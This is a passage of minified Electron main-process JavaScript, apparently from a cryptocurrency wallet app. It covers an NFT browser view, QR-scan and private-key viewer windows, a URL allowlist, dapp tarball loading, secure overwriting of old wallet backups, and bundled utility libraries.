        if (y) throw new Error("Already loaded!");
        (y = new i.BrowserView({
          webPreferences: {
            webSecurity: !0,
            enableRemoteModule: !1,
            contextIsolation: !0,
            nodeIntegration: !1,
            nodeIntegrationInWorker: !1,
            partition: "nfts",
            sandbox: !0,
            spellcheck: !1,
            webgl: !1,
            plugins: !1,
            safeDialogs: !0,
            disableDialogs: !0,
            backgroundColor: "#00000000",
            transparent: !0,
          },
          transparent: !0,
        })),
          Object(l.registerWebContents)(y.webContents, "nfts"),
          Object(a.registerBrowserView)(y),
          Object(h.updateViewBounds)(y, b),
          y.setAutoResize({ width: !0, height: !0 }),
          f.appWindows.ui.webContents.on("devtools-reload-page", () => {
            w(), Object(a.destroyBrowserView)(y);
          });
        const { session: e } = y.webContents;
        e.protocol.registerStringProtocol("exodus-nfts-api", (e, t) => {
          try {
            const t = new s.URL(e.url).searchParams.get("data");
            if (!t) throw new Error("No message found in nfts IPC request!");
            f.appWindows.ui.webContents.send("exodus-nfts-api", {
              messageString: t,
            });
          } catch (e) {
            console.error("Could not parse exodus-nfts-api request!"),
              console.error(e);
          }
          t({ mimeType: "text/plain", data: "ok" });
        }),
          c.ENV_DEV && Object(h.showDevTools)(y),
          await y.webContents.loadFile(d.WINDOW_NFTS),
          y.webContents.debugger.attach("1.3"),
          y.webContents.on("devtools-reload-page", () => {
            Object(u.targeted)("ui", "nfts-reload");
          });
      }),
      u.rpcMain.handle("nfts:showDevTools", async () => {
        Object(h.showDevTools)(y);
      }),
      u.rpcMain.handle("nfts:show", () => {
        f.appWindows.background.addBrowserView(y),
          f.appWindows.background.setTopBrowserView(f.appWindows.ui),
          Object(h.updateViewBounds)(y, b),
          Object(h.refocusView)(y);
      }),
      u.rpcMain.handle("nfts:hide", () => {
        w();
      }),
      u.rpcMain.handle("nfts:goBack", () => {
        const e = y.webContents.canGoBack();
        return e && y.webContents.goBack(), e;
      }),
      u.rpcMain.handle("nfts:api-receive", async (e, { dataString: t }) => {
        const n = JSON.stringify(JSON.parse(t));
        await y.webContents.executeJavaScript(
          `window._exodus_nfts_api.receive(${o()(n)}),0`
        );
      }),
      u.rpcMain.on("nfts:pointer", (e, t) => {
        const n = Object(h.toInputEvent)(t);
        n &&
          (["mousedown", "click"].includes(t.type) && y.webContents.focus(),
          y.webContents.debugger.sendCommand("Input.dispatchMouseEvent", n));
      });
  },
  function (e, t, n) {
    "use strict";
    var r = n(2),
      o = n(15),
      i = n(3),
      s = n(21),
      c = n(97);
    t.default = (e, t) => {
      if (i.appWindows.background.webContents.zoomFactor === e) return;
      const n = r.MIN_WIDTH * e,
        a = r.MIN_HEIGHT * e;
      i.appWindows.background.setMinimumSize(n, a);
      const [u, l] = i.appWindows.background.getSize();
      return (
        (t || u < n || l < a) &&
          ((e, t) => {
            try {
              i.appWindows.background.setSize(e, t, !1);
            } catch (e) {
              console.error("failed to update window size", e);
            }
          })(n, a),
        Object(o.allWebContents)().forEach((t) => {
          (t.zoomFactor = e),
            Object(s.updateAllViewsBounds)(),
            Object(c.updateNftsViewBounds)();
        }),
        e
      );
    };
  },
  function (e, t, n) {
    "use strict";
    var r = n(2);
    const o = !r.ENV_PROD,
      i = [
        "file-system",
        "notifications",
        "permissions-api",
        "presentation-api",
        "speech-api",
        "pepper-3d",
        "shared-workers",
        [
          "blink-features",
          [
            "FileSystem",
            "MediaSession",
            "Serial",
            "WebAuth",
            "WebBluetooth",
            "WebGPU",
            "WebHID",
            "WebNFC",
            "WebOTP",
            "WebUSB",
            "WebXR",
            "WebScheduler",
            "WindowPlacement",
            "WindowSegments",
          ].join(","),
        ],
        [
          "features",
          [
            "Reporting",
            "WebAuthentication",
            "WebNFC",
            "WebOTP",
            "WebUSB",
            "WebXR",
          ].join(","),
        ],
      ];
    t.default = [...[], ...(o || r.ENV_BUILD_EDEN, []), ...i];
  },
  function (e, t, n) {
    "use strict";
    e.exports = function (e, t) {
      if ("function" != typeof e) throw new TypeError("Expected a function.");
      var n,
        r = !1,
        o = e.name || (/function ([^\(]+)/.exec(e.toString()) || [])[1];
      return function () {
        if (r) {
          if (!0 === t)
            throw (
              ((o = o ? o + "()" : "Function"),
              new Error(o + " can only be called once."))
            );
          return n;
        }
        return (r = !0), (n = e.apply(this, arguments)), (e = null), n;
      };
    };
  },
  function (e, t, n) {
    "use strict";
    const { app: r, BrowserWindow: o } = n(0),
      i = n(127),
      s = n(126),
      { toKeyEvent: c } = n(125),
      a = n(124)("electron-localshortcut"),
      u = {},
      l = new WeakMap(),
      f = (e) => {
        if (e)
          try {
            return e.getTitle();
          } catch (e) {
            return "A destroyed window";
          }
        return "An falsy value";
      };
    function d(e) {
      if (!i(e)) {
        const t = {};
        Error.captureStackTrace(t);
        const n = `\nWARNING: ${e} is not a valid accelerator.\n\n${
          t.stack ? t.stack.split("\n").slice(4).join("\n") : t.message
        }\n`;
        console.error(n);
      }
    }
    function p(e, t) {
      let n = 0;
      for (const r of t) {
        if (s(r.eventStamp, e)) return n;
        n++;
      }
      return -1;
    }
    const h = (e) => (t, n) => {
      if ("keyUp" === n.type) return;
      const r = (function (e) {
        const t = { code: e.code, key: e.key };
        return (
          ["alt", "shift", "meta"].forEach((n) => {
            void 0 !== e[n] && (t[`${n}Key`] = e[n]);
          }),
          void 0 !== e.control && (t.ctrlKey = e.control),
          t
        );
      })(n);
      a(`before-input-event: ${n} is translated to: ${r}`);
      for (const { eventStamp: t, callback: n } of e) {
        if (s(t, r)) return a(`eventStamp: ${t} match`), void n();
        a(`eventStamp: ${t} no match`);
      }
    };
    e.exports = {
      register: function e(t, n, i) {
        let s, p;
        if (
          (void 0 === i ? ((s = u), (i = n), (n = t)) : (s = t.webContents),
          !0 === Array.isArray(n))
        )
          return void n.forEach((n) => {
            "string" == typeof n && e(t, n, i);
          });
        if (
          (a(`Registering callback for ${n} on window ${f(t)}`),
          d(n),
          a(`${n} seems a valid shortcut sequence.`),
          l.has(s))
        )
          a("Window has others shortcuts registered."), (p = l.get(s));
        else if (
          (a("This is the first shortcut of the window."),
          (p = []),
          l.set(s, p),
          s === u)
        ) {
          const e = h(p),
            t = (t, n) => {
              const r = n.webContents;
              r.on("before-input-event", e),
                r.once("closed", () =>
                  r.removeListener("before-input-event", e)
                );
            };
          o.getAllWindows().forEach((e) => t(null, e)),
            r.on("browser-window-created", t),
            (p.removeListener = () => {
              o
                .getAllWindows()
                .forEach((t) =>
                  t.webContents.removeListener("before-input-event", e)
                ),
                r.removeListener("browser-window-created", t);
            });
        } else {
          const e = h(p);
          s.on("before-input-event", e),
            (p.removeListener = () =>
              s.removeListener("before-input-event", e)),
            s.once("closed", p.removeListener);
        }
        a("Adding shortcut to window set.");
        const m = c(n);
        p.push({ eventStamp: m, callback: i, enabled: !0 }),
          a("Shortcut registered.");
      },
      unregister: function e(t, n) {
        let r;
        if (void 0 === n) (r = u), (n = t);
        else {
          if (t.isDestroyed())
            return void a("Early return because window is destroyed.");
          r = t.webContents;
        }
        if (!0 === Array.isArray(n))
          return void n.forEach((n) => {
            "string" == typeof n && e(t, n);
          });
        if (
          (a(`Unregistering callback for ${n} on window ${f(t)}`),
          d(n),
          a(`${n} seems a valid shortcut sequence.`),
          !l.has(r))
        )
          return void a(
            "Early return because window has never had shortcuts registered."
          );
        const o = l.get(r),
          i = p(c(n), o);
        -1 !== i &&
          (o.splice(i, 1), 0 === o.length && (o.removeListener(), l.delete(r)));
      },
      isRegistered: function (e, t) {
        d(t);
        const n = e.webContents,
          r = l.get(n);
        return -1 !== p(c(t), r);
      },
      unregisterAll: function (e) {
        a(`Unregistering all shortcuts on window ${f(e)}`);
        const t = e.webContents,
          n = l.get(t);
        n && n.removeListener && (n.removeListener(), l.delete(t));
      },
      enableAll: function (e) {
        a(`Enabling all shortcuts on window ${f(e)}`);
        const t = e.webContents,
          n = l.get(t);
        for (const e of n) e.enabled = !0;
      },
      disableAll: function (e) {
        a(`Disabling all shortcuts on window ${f(e)}`);
        const t = e.webContents,
          n = l.get(t);
        for (const e of n) e.enabled = !1;
      },
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "init", function () {
      return m;
    });
    var r = n(0),
      o = n(26),
      i = n(24),
      s = n(8),
      c = n(11),
      a = n(14),
      u = n(5),
      l = n(10),
      f = n(25);
    const d = {
      transparent: !0,
      width: 850,
      height: 500,
      show: !0,
      fullscreen: !1,
      fullscreenable: !1,
      maximizable: !1,
      minimizable: !1,
      resizable: !1,
      title: "Scan QR Code",
      webPreferences: { ...l.isolation, partition: "scan-qr" },
      frame: !1,
    };
    let p,
      h = !1;
    function m(e, t, n) {
      if (
        (console.log(
          `[app-run] EVENT wallet:qrCodeScan: payload = ${
            n && JSON.stringify(n)
          }`
        ),
        !n || n.assetName)
      )
        if (p) p.send("wallet:qr:changeState", n), p.show(), e.hide();
        else {
          if (h) return;
          (h = !0),
            (function (e, t, n) {
              const l = new r.BrowserWindow(d);
              Object(s.registerWebContents)(l.webContents, "scan-qr"),
                Object(a.forwardErrors)(l.webContents, "scan-qr"),
                l.loadURL(
                  Object(f.getHtmlUrl)({
                    app: r.app,
                    filePath: u.WINDOW_SCAN_QR,
                    hash: Object(o.encode)(e),
                  })
                ),
                Object(i.default)() &&
                  (Object(c.default)({
                    windowHandle: l.webContents,
                    windowId: "scanQR",
                  }),
                  (l.webContents.zoomFactor = n.webContents.zoomFactor),
                  l.show());
              let p = !1;
              return (
                r.app.on("before-quit", () => {
                  (p = !0), l.isDestroyed() || l.close();
                }),
                l.on("close", (e) => {
                  p || (e.preventDefault(), l.hide());
                }),
                new Promise((e, t) => {
                  l.webContents.once("dom-ready", () => {
                    l.show(), e(l);
                  });
                })
              );
            })(n, 0, t).then((t) => {
              (p = t),
                e.hide(),
                t.on("close", () => {
                  e.show();
                }),
                (h = !1);
            });
        }
      else
        n && n.qrData
          ? (p.hide(),
            e.show(),
            console.log(`[app-run] QR code decoded: ${n.qrData}`),
            t.webContents.send("wallet:qrCodeValue", n.qrData))
          : n.error &&
            (console.log(`[app-run] QR scan window error: ${n.error}`),
            p.hide(),
            e.show());
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "init", function () {
      return h;
    });
    var r = n(0),
      o = n(26),
      i = n(24),
      s = n(8),
      c = n(11),
      a = n(5),
      u = n(10),
      l = n(25);
    const f = {
      ...u.default,
      backgroundColor: "#FFFFFF",
      fullscreen: !1,
      fullscreenable: !1,
      width: 900,
      height: 500,
      show: !1,
      title: "PRIVATE KEYS",
      minimizable: !1,
      maximizable: !1,
      alwaysOnTop: !0,
      webPreferences: { ...u.isolation, partition: "keyviewer" },
      modal: !0,
    };
    let d = null;
    let p = 0;
    function h(e, t, n) {
      return (
        (f.webPreferences.partition = `keyviewer-${p++}`),
        (d = new r.BrowserWindow({ ...f, parent: e })),
        Object(s.registerWebContents)(d.webContents, "keyviewer"),
        d.loadURL(
          Object(l.getHtmlUrl)({
            app: r.app,
            hash: Object(o.encode)(n),
            filePath: a.WINDOW_KEYVIEWER,
          })
        ),
        Object(i.default)() &&
          Object(c.default)({
            windowHandle: d.webContents,
            windowId: "keyviewer",
          }),
        d.on("close", (e) => {
          setImmediate(() => {
            d.destroy();
          });
        }),
        d.webContents.once("dom-ready", () => {
          (d.webContents.zoomFactor = t.webContents.zoomFactor), d.show();
        }),
        d
      );
    }
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "validate", function () {
      return s;
    });
    const r = [
        /^https:\/\/support\.exodus\.(io|com)\/[a-zA-Z0-9/_-]*(#[a-zA-Z0-9%_-]+)?$/,
        /^https:\/\/etherscan\.io\/tx\/0x[a-zA-Z0-9]+$/,
        /^https:\/\/polygonscan\.com\/tx\/0x[a-zA-Z0-9]+$/,
        /^https:\/\/compound\.finance\/[a-zA-Z0-9/_-]*$/,
        /^https:\/\/youtu\.be\/jRLOG8fLwuA$/,
        /^https:\/\/compound\.finance\/documents\/Compound\.Whitepaper\.pdf$/,
      ],
      o = [/^support@exodus\.(io|com)$/];
    function i(e, t) {
      return "string" == typeof e ? e === t : e.test(t);
    }
    function s(e) {
      if ("string" != typeof e) return !1;
      let t;
      try {
        t = new URL(e);
      } catch (e) {
        return !1;
      }
      if (t.href !== e) return !1;
      if (!e.startsWith(t.protocol)) return !1;
      switch (t.protocol) {
        case "mailto:":
          if (e !== `mailto:${t.pathname}${t.search}`) return !1;
          if (t.search) {
            if (
              ![
                `?${t.searchParams}`,
                `?${(function (e) {
                  const t = [];
                  for (const [n, r] of e)
                    t.push(`${encodeURIComponent(n)}=${encodeURIComponent(r)}`);
                  return t.join("&");
                })(t.searchParams)}`,
              ].includes(t.search)
            )
              return !1;
            const e = new Set(["subject", "body"]);
            for (const [n] of t.searchParams) if (!e.has(n)) return !1;
          }
          return o.some((e) => i(e, t.pathname));
        case "https:":
          return r.some((t) => i(t, e));
      }
      return !1;
    }
  },
  function (e, t, n) {
    var r = n(35),
      o = n(137),
      i = n(132),
      s = n(64).Writable,
      c = n(64).PassThrough,
      a = function () {},
      u = function (e) {
        return (e &= 511) && 512 - e;
      },
      l = function (e, t) {
        (this._parent = e),
          (this.offset = t),
          c.call(this, { autoDestroy: !1 });
      };
    r.inherits(l, c),
      (l.prototype.destroy = function (e) {
        this._parent.destroy(e);
      });
    var f = function (e) {
      if (!(this instanceof f)) return new f(e);
      s.call(this, e),
        (e = e || {}),
        (this._offset = 0),
        (this._buffer = o()),
        (this._missing = 0),
        (this._partial = !1),
        (this._onparse = a),
        (this._header = null),
        (this._stream = null),
        (this._overflow = null),
        (this._cb = null),
        (this._locked = !1),
        (this._destroyed = !1),
        (this._pax = null),
        (this._paxGlobal = null),
        (this._gnuLongPath = null),
        (this._gnuLongLinkPath = null);
      var t = this,
        n = t._buffer,
        r = function () {
          t._continue();
        },
        c = function (e) {
          if (((t._locked = !1), e)) return t.destroy(e);
          t._stream || r();
        },
        d = function () {
          t._stream = null;
          var e = u(t._header.size);
          e ? t._parse(e, p) : t._parse(512, b), t._locked || r();
        },
        p = function () {
          t._buffer.consume(u(t._header.size)), t._parse(512, b), r();
        },
        h = function () {
          var e = t._header.size;
          (t._paxGlobal = i.decodePax(n.slice(0, e))), n.consume(e), d();
        },
        m = function () {
          var e = t._header.size;
          (t._pax = i.decodePax(n.slice(0, e))),
            t._paxGlobal && (t._pax = Object.assign({}, t._paxGlobal, t._pax)),
            n.consume(e),
            d();
        },
        y = function () {
          var r = t._header.size;
          (this._gnuLongPath = i.decodeLongPath(
            n.slice(0, r),
            e.filenameEncoding
          )),
            n.consume(r),
            d();
        },
        w = function () {
          var r = t._header.size;
          (this._gnuLongLinkPath = i.decodeLongPath(
            n.slice(0, r),
            e.filenameEncoding
          )),
            n.consume(r),
            d();
        },
        b = function () {
          var o,
            s = t._offset;
          try {
            o = t._header = i.decode(n.slice(0, 512), e.filenameEncoding);
          } catch (e) {
            t.emit("error", e);
          }
          return (
            n.consume(512),
            o
              ? "gnu-long-path" === o.type
                ? (t._parse(o.size, y), void r())
                : "gnu-long-link-path" === o.type
                ? (t._parse(o.size, w), void r())
                : "pax-global-header" === o.type
                ? (t._parse(o.size, h), void r())
                : "pax-header" === o.type
                ? (t._parse(o.size, m), void r())
                : (t._gnuLongPath &&
                    ((o.name = t._gnuLongPath), (t._gnuLongPath = null)),
                  t._gnuLongLinkPath &&
                    ((o.linkname = t._gnuLongLinkPath),
                    (t._gnuLongLinkPath = null)),
                  t._pax &&
                    ((t._header = o =
                      (function (e, t) {
                        return (
                          t.path && (e.name = t.path),
                          t.linkpath && (e.linkname = t.linkpath),
                          t.size && (e.size = parseInt(t.size, 10)),
                          (e.pax = t),
                          e
                        );
                      })(o, t._pax)),
                    (t._pax = null)),
                  (t._locked = !0),
                  o.size && "directory" !== o.type
                    ? ((t._stream = new l(t, s)),
                      t.emit("entry", o, t._stream, c),
                      t._parse(o.size, d),
                      void r())
                    : (t._parse(512, b),
                      void t.emit(
                        "entry",
                        o,
                        (function (e, t) {
                          var n = new l(e, t);
                          return n.end(), n;
                        })(t, s),
                        c
                      )))
              : (t._parse(512, b), void r())
          );
        };
      (this._onheader = b), this._parse(512, b);
    };
    r.inherits(f, s),
      (f.prototype.destroy = function (e) {
        this._destroyed ||
          ((this._destroyed = !0),
          e && this.emit("error", e),
          this.emit("close"),
          this._stream && this._stream.emit("close"));
      }),
      (f.prototype._parse = function (e, t) {
        this._destroyed ||
          ((this._offset += e),
          (this._missing = e),
          t === this._onheader && (this._partial = !1),
          (this._onparse = t));
      }),
      (f.prototype._continue = function () {
        if (!this._destroyed) {
          var e = this._cb;
          (this._cb = a),
            this._overflow ? this._write(this._overflow, void 0, e) : e();
        }
      }),
      (f.prototype._write = function (e, t, n) {
        if (!this._destroyed) {
          var r = this._stream,
            o = this._buffer,
            i = this._missing;
          if ((e.length && (this._partial = !0), e.length < i))
            return (
              (this._missing -= e.length),
              (this._overflow = null),
              r ? r.write(e, n) : (o.append(e), n())
            );
          (this._cb = n), (this._missing = 0);
          var s = null;
          e.length > i && ((s = e.slice(i)), (e = e.slice(0, i))),
            r ? r.end(e) : o.append(e),
            (this._overflow = s),
            this._onparse();
        }
      }),
      (f.prototype._final = function (e) {
        if (this._partial)
          return this.destroy(new Error("Unexpected end of data"));
        e();
      }),
      (e.exports = f);
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "default", function () {
      return p;
    });
    var r = n(9),
      o = n.n(r),
      i = n(1),
      s = n(105),
      c = n.n(s),
      a = n(73),
      u = n.n(a);
    const l = (e) =>
        new Promise((t, n) => {
          const r = c()(),
            o = new Map();
          r.on("error", n),
            r.on("finish", () =>
              t(new Map(Array.from(o, ([e, t]) => [e, Buffer.concat(t)])))
            ),
            r.on("entry", (e, t, r) => {
              if ("directory" === e.type) return r();
              if ("file" !== e.type)
                return n(
                  new Error(
                    "Dapp tarball should contain only regular files and directories"
                  )
                );
              const s = i.posix.normalize(e.name);
              return (function (e) {
                return !(
                  e.length < 1 ||
                  e.length > 1024 ||
                  e.includes("..") ||
                  e.includes("//") ||
                  e.startsWith("/") ||
                  e.endsWith("/") ||
                  !/^[a-zA-Z0-9\-_./]+$/.test(e)
                );
              })(s)
                ? o.has(s)
                  ? n(
                      new Error(
                        `Found duplicate tar archive entry while reading cached dapp: ${e.name}`
                      )
                    )
                  : (o.set(s, []),
                    t.on("end", () => r()),
                    t.on("data", (e) => o.get(s).push(e)),
                    void t.resume())
                : n(
                    new Error(
                      `Found unexpected path in tar archive while reading cached dapp: ${e.name}`
                    )
                  );
            }),
            u.a.unzip(e, (e, t) => {
              if (e) return n(e);
              r.end(t);
            });
        }),
      f = {
        ".html": "text/html",
        ".js": "text/javascript",
        ".css": "text/css",
        ".json": "application/json",
        ".png": "image/png",
        ".jpg": "image/jpg",
        ".gif": "image/gif",
        ".svg": "image/svg+xml",
        ".wav": "audio/wav",
        ".mp4": "video/mp4",
        ".woff": "application/font-woff",
        ".ttf": "application/font-ttf",
        ".eot": "application/vnd.ms-fontobject",
        ".otf": "application/font-otf",
        ".wasm": "application/wasm",
        ".webp": "image/webp",
      },
      d = () => ({
        status: 404,
        headers: { "Content-Type": "text/html" },
        body: "<h1>Error: 404, not found</h1>",
      });
    async function p(e) {
      const t = await o.a.readFile(e),
        n = await l(t),
        r = (e) => {
          const t = i.posix.extname(e),
            r = i.posix.normalize(e);
          if (!n.has(r)) return d();
          const o = n.get(r);
          return {
            status: 200,
            headers: {
              "Referrer-Policy": "strict-origin",
              "X-Frame-Options": "SAMEORIGIN",
              "X-Content-Type-Options": "nosniff",
              "X-XSS-Protection": "1; mode=block",
              "Content-Type": f.hasOwnProperty(t)
                ? f[t]
                : "application/octet-stream",
            },
            body: o,
          };
        };
      return (r.notFound = d), r;
    }
  },
  function (e, t, n) {
    "use strict";
    t.default = `(${function (e) {
      const t = {
        items: new Map(e),
        get length() {
          return this.items.size;
        },
        key(e) {
          return Array.from(this.items.keys())[Number(e)];
        },
        getItem(e) {
          return this.items.get(String(e));
        },
        setItem(e, t) {
          ([e, t] = [e, t].map(String)),
            this.items.set(e, t),
            window._exodus_dapp_api.rpc
              .callMethod("setLocalStorageItem", [e, t])
              .catch((e) =>
                console.error("Failed to set local storage value", e)
              );
        },
        removeItem(e) {
          e = String(e);
          const t = this.items.delete(e);
          return (
            window._exodus_dapp_api.rpc
              .callMethod("deleteLocalStorageItem", [e])
              .catch((e) =>
                console.error("Failed to delete local storage value", e)
              ),
            t
          );
        },
        clear() {
          this.items.clear(),
            window._exodus_dapp_api.rpc
              .callMethod("clearLocalStorageItems")
              .catch((e) =>
                console.error("Failed to clear local storage values", e)
              );
        },
      };
      Object.defineProperty(window, "localStorage", {
        value: new Proxy(t, {
          has: (e, t) => e.items.has(t) || t in e,
          get: (e, t) => (t in e ? e[t] : e.getItem(t)),
          set: (e, t, n) => e.setItem(t, n),
          deleteProperty: (e, t) => e.removeItem(t),
        }),
      });
    }})`;
  },
  function (e, t, n) {
    const r = n(9),
      { createStorageInternal: o, addNamespacing: i } = n(176),
      { getLockFile: s } = n(81);
    e.exports = {
      createStorage: function (e) {
        const t = o(e);
        return i(t);
      },
      isStorageWriting: function (e) {
        return r.pathExistsSync(s(e));
      },
    };
  },
  function (e, t) {
    e.exports = require("events");
  },
  function (e, t, n) {
    const r = n(182),
      { randomBytes: o } = n(31);
    e.exports = async function (e, t = {}) {
      let n, i;
      const s = Buffer.alloc(16384);
      try {
        const c = await r.stat(e);
        if (!c.isFile()) throw new Error(`${e} is not file`);
        let a = c.size;
        if (t.size) {
          const e = t.size.toString().match(/^(\d+)([KMG]?)$/);
          if (null === e) throw new Error(`invalid size: ${t.size}`);
          a =
            parseInt(e[1], 10) *
            ("K" === e[2]
              ? 1024
              : "M" === e[2]
              ? 1048576
              : "G" === e[2]
              ? 1073741824
              : 1);
        }
        let u = 3;
        if (t.iterations) {
          if (null === t.iterations.toString().match(/^\d+$/))
            throw new Error(`invalid iterations: ${t.iterations}`);
          u = parseInt(t.iterations, 10);
        }
        if (!(u >= 1)) throw new Error(`invalid iterations: ${t.iterations}`);
        if ((t.zero && (u -= 1), (n = await r.open(e, "w")), t.randomSource)) {
          i = await r.open(t.randomSource, "r");
          let e = 0;
          for (let r = 0, o = 0; r < u; ++r)
            for (; o < a; ) {
              const r = Math.min(s.length, a - o),
                { bytesRead: c } = await i.read(s, 0, r, e);
              if (0 === c)
                throw new Error(`not enough data in ${t.randomSource}`);
              e += c;
              const { bytesWritten: u } = await n.write(s, 0, c, o);
              if (u !== c) throw new Error("lost data on overwrite");
              o += c;
            }
          await i.close(), (i = void 0);
        } else
          for (let e = 0; e < u; ++e)
            for (let e = 0; e < a; ) {
              const t = Math.min(16384, a - e),
                r = o(t),
                { bytesWritten: i } = await n.write(r, 0, t, e);
              if (i !== t) throw new Error("lost data on overwrite");
              e += t;
            }
        if (t.zero) {
          s.fill(0);
          for (let e = 0; e < a; ) {
            const t = Math.min(s.length, a - e),
              { bytesWritten: r } = await n.write(s, 0, t, e);
            if (r !== t) throw new Error("lost data on overwrite");
            e += t;
          }
        }
        await n.close(), (n = void 0), t.remove && (await r.unlink(e));
      } catch (e) {
        throw (
          (await Promise.all(
            [n, i].filter((e) => !!e).map((e) => e.close().catch(() => {}))
          ).catch(() => {}),
          e)
        );
      }
    };
  },
  function (e, t, n) {
    "use strict";
    var r = n(9),
      o = n.n(r),
      i = n(52),
      s = n.n(i),
      c = n(1),
      a = n.n(c),
      u = n(110),
      l = n.n(u),
      f = n(37);
    t.default = async function () {
      const e = Object(f.walletBackupDir)();
      let t;
      try {
        t = await o.a.readdir(e);
      } catch (e) {
        if ("ENOENT" === e.code) return;
        throw e;
      }
      const n = Date.now() - s()("90 days"),
        r = t
          .filter((e) => new Date(e.split("_")[0]).getTime() < n)
          .map((t) => a.a.resolve(e, t));
      if (!r.length) return;
      const i = { iterations: 1 };
      await Promise.all(
        r.map((e) =>
          (async function (e, t) {
            const n = await o.a.readdir(e);
            return Promise.all(n.map((n) => l()(a.a.join(e, n), t)));
          })(a.a.join(e, "exodus.wallet"), i)
        )
      ),
        await Promise.all(r.map((e) => o.a.remove(e)));
    };
  },
  function (e, t, n) {
    "use strict";
    n.d(t, "getAutoUpdateUrls", function () {
      return s;
    });
    var r = n(48),
      o = n.n(r),
      i = n(2);
    const s = (e) => {
      const t = e ? `feed-${e}` : "feed";
      return {
        darwin: o()(i.AUTO_UPDATE_BASE_URL, `${t}/darwin.json`),
        darwinArm: o()(i.AUTO_UPDATE_BASE_URL, `${t}/darwin-arm64.json`),
        linux: o()(i.AUTO_UPDATE_BASE_URL, `${t}/linux-${process.arch}.json`),
        win32: o()(i.AUTO_UPDATE_BASE_URL, `${t}/win32-${process.arch}`),
      };
    };
  },
  function (e, t) {
    function n(e) {
      if (!(this instanceof n)) return new n(e);
      this.value = e;
    }
    function r(e, t, n) {
      var r = [],
        i = [],
        s = !0;
      return (function e(c) {
        var a = n ? o(c) : c,
          u = {},
          l = {
            node: a,
            node_: c,
            path: [].concat(r),
            parent: i.slice(-1)[0],
            key: r.slice(-1)[0],
            isRoot: 0 === r.length,
            level: r.length,
            circular: null,
            update: function (e) {
              l.isRoot || (l.parent.node[l.key] = e), (l.node = e);
            },
            delete: function () {
              delete l.parent.node[l.key];
            },
            remove: function () {
              Array.isArray(l.parent.node)
                ? l.parent.node.splice(l.key, 1)
                : delete l.parent.node[l.key];
            },
            before: function (e) {
              u.before = e;
            },
            after: function (e) {
              u.after = e;
            },
            pre: function (e) {
              u.pre = e;
            },
            post: function (e) {
              u.post = e;
            },
            stop: function () {
              s = !1;
            },
          };
        if (!s) return l;
        if ("object" == typeof a && null !== a) {
          l.isLeaf = 0 == Object.keys(a).length;
          for (var f = 0; f < i.length; f++)
            if (i[f].node_ === c) {
              l.circular = i[f];
              break;
            }
        } else l.isLeaf = !0;
        (l.notLeaf = !l.isLeaf), (l.notRoot = !l.isRoot);
        var d = t.call(l, l.node);
        if (
          (void 0 !== d && l.update && l.update(d),
          u.before && u.before.call(l, l.node),
          "object" == typeof l.node && null !== l.node && !l.circular)
        ) {
          i.push(l);
          var p = Object.keys(l.node);
          p.forEach(function (t, o) {
            r.push(t), u.pre && u.pre.call(l, l.node[t], t);
            var i = e(l.node[t]);
            n && Object.hasOwnProperty.call(l.node, t) && (l.node[t] = i.node),
              (i.isLast = o == p.length - 1),
              (i.isFirst = 0 == o),
              u.post && u.post.call(l, i),
              r.pop();
          }),
            i.pop();
        }
        return u.after && u.after.call(l, l.node), l;
      })(e).node;
    }
    function o(e) {
      var t;
      return "object" == typeof e && null !== e
        ? ((t = Array.isArray(e)
            ? []
            : e instanceof Date
            ? new Date(e)
            : e instanceof Boolean
            ? new Boolean(e)
            : e instanceof Number
            ? new Number(e)
            : e instanceof String
            ? new String(e)
            : Object.create(Object.getPrototypeOf(e))),
          Object.keys(e).forEach(function (n) {
            t[n] = e[n];
          }),
          t)
        : e;
    }
    (e.exports = n),
      (n.prototype.get = function (e) {
        for (var t = this.value, n = 0; n < e.length; n++) {
          var r = e[n];
          if (!Object.hasOwnProperty.call(t, r)) {
            t = void 0;
            break;
          }
          t = t[r];
        }
        return t;
      }),
      (n.prototype.set = function (e, t) {
        for (var n = this.value, r = 0; r < e.length - 1; r++) {
          var o = e[r];
          Object.hasOwnProperty.call(n, o) || (n[o] = {}), (n = n[o]);
        }
        return (n[e[r]] = t), t;
      }),
      (n.prototype.map = function (e) {
        return r(this.value, e, !0);
      }),
      (n.prototype.forEach = function (e) {
        return (this.value = r(this.value, e, !1)), this.value;
      }),
      (n.prototype.reduce = function (e, t) {
        var n = 1 === arguments.length,
          r = n ? this.value : t;
        return (
          this.forEach(function (t) {
            (this.isRoot && n) || (r = e.call(this, r, t));
          }),
          r
        );
      }),
      (n.prototype.deepEqual = function (e) {
        if (1 !== arguments.length)
          throw new Error(
            "deepEqual requires exactly one object to compare against"
          );
        var t = !0,
          r = e;
        return (
          this.forEach(function (o) {
            var i = function () {
              t = !1;
            }.bind(this);
            if (!this.isRoot) {
              if ("object" != typeof r) return i();
              r = r[this.key];
            }
            var s = r;
            this.post(function () {
              r = s;
            });
            var c = function (e) {
              return Object.prototype.toString.call(e);
            };
            if (this.circular) n(e).get(this.circular.path) !== s && i();
            else if (typeof s != typeof o) i();
            else if (null === s || null === o || void 0 === s || void 0 === o)
              s !== o && i();
            else if (s.__proto__ !== o.__proto__) i();
            else if (s === o);
            else if ("function" == typeof s)
              s instanceof RegExp
                ? s.toString() != o.toString() && i()
                : s !== o && i();
            else if ("object" == typeof s)
              if (
                "[object Arguments]" === c(o) ||
                "[object Arguments]" === c(s)
              )
                c(s) !== c(o) && i();
              else if (s instanceof Date || o instanceof Date)
                (s instanceof Date &&
                  o instanceof Date &&
                  s.getTime() === o.getTime()) ||
                  i();
              else {
                var a = Object.keys(s),
                  u = Object.keys(o);
                if (a.length !== u.length) return i();
                for (var l = 0; l < a.length; l++) {
                  var f = a[l];
                  Object.hasOwnProperty.call(o, f) || i();
                }
              }
          }),
          t
        );
      }),
      (n.prototype.paths = function () {
        var e = [];
        return (
          this.forEach(function (t) {
            e.push(this.path);
          }),
          e
        );
      }),
      (n.prototype.nodes = function () {
        var e = [];
        return (
          this.forEach(function (t) {
            e.push(this.node);
          }),
          e
        );
      }),
      (n.prototype.clone = function () {
        var e = [],
          t = [];
        return (function n(r) {
          for (var i = 0; i < e.length; i++) if (e[i] === r) return t[i];
          if ("object" == typeof r && null !== r) {
            var s = o(r);
            return (
              e.push(r),
              t.push(s),
              Object.keys(r).forEach(function (e) {
                s[e] = n(r[e]);
              }),
              e.pop(),
              t.pop(),
              s
            );
          }
          return r;
        })(this.value);
      }),
      Object.keys(n.prototype).forEach(function (e) {
        n[e] = function (t) {
